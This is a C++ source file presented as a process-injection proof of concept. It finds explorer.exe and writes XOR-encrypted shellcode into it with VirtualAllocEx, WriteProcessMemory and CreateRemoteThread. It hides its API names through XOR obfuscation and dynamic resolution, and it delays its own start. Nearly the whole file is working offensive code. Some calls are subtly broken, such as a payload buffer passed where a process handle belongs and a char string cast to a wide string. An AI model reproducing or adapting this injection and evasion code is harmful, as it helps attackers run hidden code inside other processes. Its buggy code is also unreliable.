/*
    Author:     lemur
    Github:     https://github.com/1emvr
    Email:      1emvr@protonmail.com
    Date:       01.10.2023  17:33 PM

    Process injection proof of concept (calc.exe)
    Prototypes and definitions from: https://learn.microsoft.com/en-us/windows/win32/api
*/
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <synchapi.h>
#include <stdlib.h>

#include <cstdint>
#include <iostream>

#include "resource.h"

typedef HANDLE(WINAPI* OpenProcess_t)(

    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
);
typedef LPVOID(WINAPI* VirtualAllocEx_t)(

    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
typedef BOOL(WINAPI* WriteProcessMemory_t)(

    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(

    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

using namespace std;
char XORCipher(u_char* data, int datalen, u_char* key, int keylen) {

    cout << "[+] XORCipher checkpoint" << "\n";

    int j = 0;
    for (int i = 0; i < datalen; i++) {
        if (j == keylen - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
    cout << "[+] XOR Parsed" << "\n";
    return *data;
}

HANDLE FindTargetProcess(const char processName[]) {

    int pid = 0;
    cout << "[+] FindTargetProcess checkpoint" << "\n";

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    cout << "[+] Snapshot created" << "\n";

    if (INVALID_HANDLE_VALUE == hSnapshot) {

        cout << "[!] Error: Invalid Snapshot" << "\n";
        return 0;
    }
    else { cout << "[+] Snapshot valid" << "\n"; }

    PROCESSENTRY32 processListEntry;
    processListEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processListEntry)) {

        cout << "[*] Error parsing process list" << "\n";
        CloseHandle(hSnapshot);
        return 0;
    }
    cout << "[*] Iterating processes" << "\n";
    
    while (Process32Next(hSnapshot, &processListEntry)) {
        if (lstrcmpiA(processName, (LPCSTR)processListEntry.szExeFile) == 0) {

            pid = processListEntry.th32ProcessID;
            cout << "[*] PID Found for " << processName << "\n";
            break;
        }
    }

    CloseHandle(hSnapshot);
    cout << "[-] Closing snapshot handle" << "\n";

    if (pid) {
        
        cout <<processName<< " PID =" <<pid<< "\n";

        XORCipher(sOpenProcessXORed, sizeof(sOpenProcessXORed), UB_fht, sizeof(UB_fht));
        OpenProcess_t pOpenProcess = (OpenProcess_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sOpenProcessXORed);
        cout << "[+] Process found. Opening" << "\n";

        return pOpenProcess(
            PROCESS_CREATE_THREAD /* | PROCESS_QUERY_INFORMATION */| PROCESS_VM_OPERATION /* | PROCESS_VM_READ | PROCESS_VM_WRITE */, FALSE, (DWORD)pid
        );
    }

    cout << "[+] Handle information returned" << "\n";
    return NULL;
}

int InjectPayload(HANDLE hProcess, u_char* Table, u_int TableSize) {

    cout << "[+] InjectPayload checkpoint" << "\n";

    // VirtualAllocEx
    LPVOID pRemoteShellcode = NULL;
    XORCipher(sVirtualAllocExXORed, sizeof(sVirtualAllocExXORed), UB_fht, sizeof(UB_fht));
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sVirtualAllocExXORed);
    pRemoteShellcode = pVirtualAllocEx(Table, NULL, TableSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    cout << "[+] Memory allocated" << "\n";

    // WriteProcessMemory
    XORCipher(sWriteProcessMemoryXORed, sizeof(sWriteProcessMemoryXORed), UB_fht, sizeof(UB_fht));
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sWriteProcessMemoryXORed);
    XORCipher(Table, TableSize, UB_fht, sizeof(UB_fht));
    pWriteProcessMemory(hProcess, pRemoteShellcode, Table, TableSize, NULL);
    cout << "[+] Process memory written" << "\n";

    // CreateRemoteThread
    HANDLE hThread = NULL;
    XORCipher(sCreateRemoteThreadXORed, sizeof(sCreateRemoteThreadXORed), UB_fht, sizeof(UB_fht));
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), (LPCSTR)sCreateRemoteThreadXORed);
    hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    cout << "[+] Remote thread created" << "\n";

    if (hThread != NULL) {
  
        WaitForSingleObject(hThread, INFINITE);
        cout << "[*] Waiting for target process" << "\n";
        CloseHandle(hThread);
        cout << "[!] Thread executed" << "\n";
        return 0;
    }
    return -1;
}
int main() {
//int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdLine, int nCmdShow) {
    
    cout << "[+] Main checkpoint" << "\n";
    cout << "[*] Delay exectuion" << "\n";

    Sleep(5000);
    HANDLE hProcess = NULL;

    u_int TableSize = sizeof(_LTABLI);
    hProcess = FindTargetProcess("explorer.exe");

    if (hProcess != NULL) {
        InjectPayload(hProcess, _LTABLI, TableSize);
        CloseHandle(hProcess);
        cout << "[-] Closing process handle" << "\n";
    } else { cout << "[!] Error : Process handle returns NULL" << "\n"; }

    cout << "[-] Done." << "\n";
    return 0;
}
